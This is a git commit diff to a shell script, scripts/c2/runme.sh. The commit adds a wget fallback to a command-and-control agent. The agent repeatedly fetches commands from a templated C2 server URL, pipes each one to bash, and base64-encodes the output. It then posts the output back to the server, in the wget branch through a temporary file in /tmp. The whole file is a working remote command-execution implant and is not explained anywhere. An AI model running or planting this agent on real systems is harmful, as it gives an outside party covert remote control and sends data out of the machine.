d56d6e097c34e30ae09f75388634e8e0a5043f03
Alex Chapman <3729326+ajxchapman@users.noreply.github.com>
2020-06-15 17:55:09 +0100

    Use wget if curl is not available

--- scripts/c2/runme.sh
+++ scripts/c2/runme.sh
@@ -1,9 +1,25 @@
-#!/bin/bash
-C2_URL="https://__HOSTNAME__$(echo __PATH__ | sed -E 's#/[^/]+$##')"
+#!/bin/sh
+C2_URL="__SCHEME__://__HOSTNAME__$(echo __PATH__ | sed -E 's#/[^/]+$##')"
+
+if which curl > /dev/null
+then
+  DRIVER="curl"
+elif which wget > /dev/null
+then
+  DRIVER="wget"
+else
+  exit 1
+fi
 
 while [ true ]
 do
-  CMD=$(curl -s "$C2_URL/get_cmd")
+  if [ "${DRIVER}" = "curl" ]
+  then
+    CMD=$(curl -s "${C2_URL}/get_cmd")
+  elif [ "${DRIVER}" = "wget" ]
+  then
+    CMD=$(wget -q -O- "${C2_URL}/get_cmd")
+  fi
   if [ ! -z "$CMD" ]
   then
     ID=$(echo $CMD | cut -d, -f 1)
@@ -11,7 +27,15 @@ do
     CMD=$(echo $CMD | cut -d, -f 3-)
     if [ ! "$FG" = "false" ]
     then
-      echo "$CMD" | bash | base64 | curl -s -d @- "${C2_URL}/put_result?id=$ID"
+      if [ "${DRIVER}" = "curl" ]
+      then
+        echo "$CMD" | bash | base64 | curl -s -d @- "${C2_URL}/put_result?id=${ID}"
+      elif [ "${DRIVER}" = "wget" ]
+      then
+        echo "$CMD" | bash | base64 > /tmp/c2file
+        wget -q --post-file=/tmp/c2file "${C2_URL}/put_result?id=${ID}"
+        rm /tmp/c2file
+      fi
     else
       echo "$CMD" | bash &
     fi
